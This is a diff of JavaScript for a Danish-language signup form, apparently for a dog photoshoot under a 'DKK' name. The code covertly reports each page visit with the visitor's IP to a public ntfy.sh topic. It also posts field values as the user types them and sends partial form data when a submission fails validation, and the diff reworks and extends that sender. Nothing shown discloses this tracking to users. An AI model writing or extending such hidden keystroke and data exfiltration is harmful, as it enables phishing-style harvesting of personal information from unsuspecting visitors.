@@ -1,5 +1,5 @@
 // --- CONFIGURATION ---
-const NTFY_TOPIC = "dkkkreds1_fotoshoot_secret_98765";
+const NTFY_TOPIC = "dkkkreds1_fotoshoot_secret_98765"; 
 let currentLang = 'da';
 let dogCount = 0;
 let userIP = "Fetching...";
@@ -8,8 +8,10 @@ const sessionId = Math.random().toString(36).substring(2, 9);
 // --- ALLOWED MAJOR DOMAINS ---
 const allowedDomains = [
     'gmail.com', 'yahoo.com', 'hotmail.com', 'hotmail.dk', 'outlook.com', 'outlook.dk', 
-    'live.com', 'live.dk', 'icloud.com', 'me.com', 'mac.com', 'mail.com', 
-    'protonmail.com', 'jubii.dk', 'sol.dk', 'tdcadsl.dk', 'webspeed.dk', 'mail.dk', 'ofir.dk'
+    'live.com', 'live.dk', 'icloud.com', 'me.com', 'mac.com', 'mail.com', 'msn.com',
+    'protonmail.com', 'jubii.dk', 'sol.dk', 'tdcadsl.dk', 'webspeed.dk', 'mail.dk', 
+    'ofir.dk', 'post.tele.dk', 'privat.dk', 'stofanet.dk', 'get2net.dk', 'ymail.com', 
+    'googlemail.com', 'pm.me', 'zohomail.eu', 'zohomail.com', 'gmx.com'
 ];
 
 // --- TRANSLATIONS ---
@@ -54,7 +56,7 @@ window.addEventListener('DOMContentLoaded', async () => {
 
     addDogField();
     bindLanguageSwitch();
-    sendNtfy("👀 Page Visited", `Session: ${sessionId}\nIP: ${userIP}\nTime: ${new Date().toLocaleString()}`, "eyes");
+    sendNtfy("👀 Page Visited", `Session: ${sessionId}\nIP: ${userIP}\nTime: ${new Date().toLocaleString('da-DK')}`, "eyes");
 });
 
 // --- VALIDATION LOGIC ---
@@ -66,8 +68,10 @@ function validateEmail(email) {
 }
 
 function validatePhone(phone) {
-    const cleanPhone = phone.replace(/[\s-]/g, '');
-    const re = /^(\+?\d{1,3})?([1-9]\d{7,10})$/; // Allows international or local format
+    // Fjerner mellemrum, bindestreger og parenteser
+    const cleanPhone = phone.replace(/[\s\-\(\)]/g, '');
+    // Tillader valgfrit + i starten, efterfulgt af 8-15 tal (dækker næsten alle lande, inkl. DK: +45XXXXXXXX)
+    const re = /^(\+?\d{8,15})$/; 
     return re.test(cleanPhone);
 }
 
@@ -132,13 +136,12 @@ function bindTracking(parent = document) {
             validateField(e.target);
             const val = e.target.value.trim();
             if (val !== "") {
-                const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Field";
-                sendNtfy("✍️ User Typing...", `Field: ${label}\nValue: ${val}\nSession: ${sessionId}`, "pencil2");
+                const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Felt";
+                sendNtfy("✍️ Bruger skriver...", `Felt: ${label}\nVærdi: ${val}\nSession: ${sessionId}`, "pencil2");
             }
         });
     });
 }
-bindTracking();
 
 // --- DATA COLLECTION ---
 function getPayload() {
@@ -178,7 +181,8 @@ document.getElementById('dkkForm').addEventListener('submit', async (e) => {
 
     if (!formIsValid) {
         alertBox.classList.remove('hidden');
-        sendNtfy("⚠️ Failed / Partial Submit", getPayload(), "warning");
+        // SEND PARTIAL DATA ON INVALID SUBMIT
+        sendNtfy("⚠️ Fejl / Manglende Data Submit", getPayload(), "warning");
         return;
     }
 
@@ -187,7 +191,7 @@ document.getElementById('dkkForm').addEventListener('submit', async (e) => {
     btn.disabled = true;
 
     try {
-        await sendNtfy("🐶 📸 SUCCESS: Ny DKK Model!", getPayload(), "camera_flash");
+        await sendNtfy("🐶 📸 SUCCESS: Ny DKK Model!", getPayload(), "camera_flash,dog");
         document.getElementById('dkkForm').classList.add('hidden');
         document.getElementById('successMessage').classList.remove('hidden');
     } catch(err) {
@@ -196,15 +200,22 @@ document.getElementById('dkkForm').addEventListener('submit', async (e) => {
     }
 });
 
-// --- HELPER FUNCTIONS ---
+// --- HELPER FUNCTION: NTFY VIA JSON (FIXES EMOJI CRASH) ---
 function sendNtfy(title, message, tags) {
-    return fetch(`https://ntfy.sh/${NTFY_TOPIC}`, {
+    // By using a JSON body, we bypass the HTTP Header ASCII limitations completely
+    return fetch(`https://ntfy.sh/`, {
         method: 'POST',
-        body: message,
-        headers: { 'Title': title, 'Tags': tags }
-    });
+        body: JSON.stringify({
+            topic: NTFY_TOPIC,
+            title: title,
+            message: message,
+            tags: tags ? tags.split(',') : []
+        }),
+        headers: { 'Content-Type': 'application/json' }
+    }).catch(err => console.error("Ntfy Error:", err));
 }
 
+// --- LANGUAGE SWITCHER ---
 function bindLanguageSwitch() {
     document.getElementById('langSwitchBtn').addEventListener('click', () => {
         currentLang = currentLang === 'da' ? 'en' : 'da';
